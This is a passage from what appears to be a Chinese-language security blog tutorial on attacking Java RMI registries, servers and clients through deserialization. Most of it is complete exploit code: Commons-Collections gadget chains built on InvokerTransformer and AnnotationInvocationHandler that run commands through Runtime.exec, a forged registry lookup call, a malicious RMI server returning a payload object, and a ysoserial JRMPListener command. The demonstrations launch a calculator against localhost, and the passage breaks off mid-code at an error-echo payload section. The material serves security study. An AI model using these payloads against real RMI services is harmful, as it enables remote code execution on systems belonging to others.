java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Clienthack</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[]&#123;"calc"&#125;)&#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>);</span><br><span class="line">        Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">        Constructor constructor = constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map map = (Map)constructor.newInstance(innermap,chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">map</span>)</span>; <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;,<span class="title">map_handler</span>)</span>; <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">proxy_map</span>)</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">8888</span>);</span><br><span class="line">        Remote r = Remote<span class="class">.<span class="keyword">class</span>.<span class="title">cast</span>(<span class="title">Proxy</span>.<span class="title">newProxyInstance</span>(</span></span><br><span class="line"><span class="class">                <span class="title">Remote</span>.<span class="title">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">                new Class[] &#123; Remote.class &#125;, handler));</span><br><span class="line">        <span class="comment">// 获取ref</span></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        UnicastRef ref = (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line"></span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line"></span><br><span class="line">        var3.writeObject(r);</span><br><span class="line"></span><br><span class="line">        ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h1><p>在通信过程中，RMI与注册中心以及服务端进行了交互，我们需要对这两者做手脚，从而达到攻击客户端的目的。 </p><h2 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h2><p>对于注册中心来说，我们还是从这几个方法触发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bind</span><br><span class="line">unbind</span><br><span class="line">rebind</span><br><span class="line">list</span><br><span class="line">lookup</span><br></pre></td></tr></table></figure><p>这里的每个方法，除了unbind和rebind，其他的都会返回数据给客户端，此时的数据是序列化的数据，所以客户端自然也会反序列化，那么我们只需要伪造注册中心的返回数据，就可以达到攻击客户端的效果啦。</p><p>这里yso的JRMPListener已经做好了，命令如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-<span class="number">30099844</span>c6-<span class="number">1</span>.jar ysoserial.exploit.JRMPListener <span class="number">12345</span>  CommonsCollections1 <span class="string">"calc"</span></span><br></pre></td></tr></table></figure><p>elient </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">12345</span>);</span><br><span class="line">        registry.lookup(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务中心攻击客户端"><a href="#服务中心攻击客户端" class="headerlink" title="服务中心攻击客户端"></a>服务中心攻击客户端</h2><p>服务端攻击客户端，大抵可以分为以下两种情景。</p><ul><li>服务端返回参数为Object对象</li><li>可以使用codebase </li></ul><p><strong>服务端返回参数为Object对象</strong><br>在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。</p><p>所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。</p><p>这里我还是以cc1为例，简单的演示一下。<br>User接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getUser</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意UserImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LocalUser</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">User</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LocalUser</span><span class="params">(String name, <span class="keyword">int</span> age)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[]&#123;</span><br><span class="line">                            String.class, Class[].class&#125;, new Object[]&#123;</span><br><span class="line">                            <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                            Object.class, Object[].class&#125;, new Object[]&#123;</span><br><span class="line">                            <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                            new Class[]&#123;String.class&#125;, new Object[]&#123;"open  /System/Applications/Calculator.app"&#125;)&#125;);</span><br><span class="line">            HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Class clazz = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>);</span><br><span class="line">            Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">            Constructor constructor = constructors[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Map map = (Map) constructor.newInstance(innermap, chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">            handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>; <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line">            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;, <span class="title">map_handler</span>)</span>; <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">            AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">proxy_map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Object)handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"["</span>+<span class="keyword">this</span>.name+<span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(Object user)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意服务端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, InterruptedException, NotBoundException </span>&#123;</span><br><span class="line">        User liming = <span class="keyword">new</span> LocalUser(<span class="string">"liming"</span>,<span class="number">15</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">8888</span>);</span><br><span class="line">        registry.bind(<span class="string">"user"</span>,liming);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"registry is running..."</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"liming is bind in registry"</span>);</span><br><span class="line"></span><br><span class="line">        CountDownLatch latch=<span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        latch.await();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时当客户端调用服务端绑定的远程对象的getUser方法时，将反序列化服务端传来的恶意远程对象。此时将触发Rce。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">8888</span>);</span><br><span class="line">        User user= (User) registry.lookup(<span class="string">"user"</span>);</span><br><span class="line">        user.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>远程加载对象</strong>   </p><p>这个条件十分十分苛刻，在现实生活中基本不可能碰到。</p><p>当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。</p><p>具体可以参考这篇文章，利用条件太过于苛刻了：<a href="https://paper.seebug.org/1091/#serverrmi-server" target="_blank" rel="noopener">https://paper.seebug.org/1091/#serverrmi-server</a></p><p>java.security.policy这个默认是没有配置的，需要我们手动去配置。 </p><h1 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h1><p>上面说了利用注册中心攻击客户端，同样的方法也可以攻击服务端，这里说一下客户端攻击服务端的方式   </p><p><strong>当服务端的远程方法存在Object参数的情况下</strong></p><p>在上上面写了，如果服务端的某个方法，传递的参数是Object类型的参数，当服务端接收数据时，就会调用readObject，所以我们可以从这个角度入手来攻击服务端。</p><p>前提：</p><p>服务端的某个远程方法传递参数为Object<br>我们需要先在User接口中新增这么一个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateName</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(Object user)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line">`</span><br></pre></td></tr></table></figure><p>此时多了一个addUser方法，当客户端调用这个方法时候，服务端会对其传递的参数进行反序列化。</p><p>Client Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[]&#123;"open  /System/Applications/Calculator.app"&#125;)&#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>);</span><br><span class="line">        Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">        Constructor constructor = constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map map = (Map)constructor.newInstance(innermap,chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">map</span>)</span>; <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;,<span class="title">map_handler</span>)</span>; <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">proxy_map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">8888</span>);</span><br><span class="line">        User user = (User) registry.lookup(<span class="string">"user"</span>);</span><br><span class="line">        user.addUser(handler);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>远程加载对象</strong>   </p><p>和上边Server打Client一样，都属于十分十分十分难利用的点。</p><p>参考：<a href="https://paper.seebug.org/1091/#serverrmi" target="_blank" rel="noopener">https://paper.seebug.org/1091/#serverrmi</a></p><h1 id="基于报错回显的-payload"><a href="#基于报错回显的-payload" class="headerlink" title="基于报错回显的 payload"></a>基于报错回显的 payload</h1><p>详情可看此文章：<a href="https://xz.aliyun.com/t/2223" target="_blank" rel="noopener">https://xz.aliyun.com/t/2223</a><br><img src="../../images/java/rmi/2.png" alt=""><br> 网上流传的基于报错回显的 payload<br>先抛出 rmi 反序列化的exp</p><p>本地：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 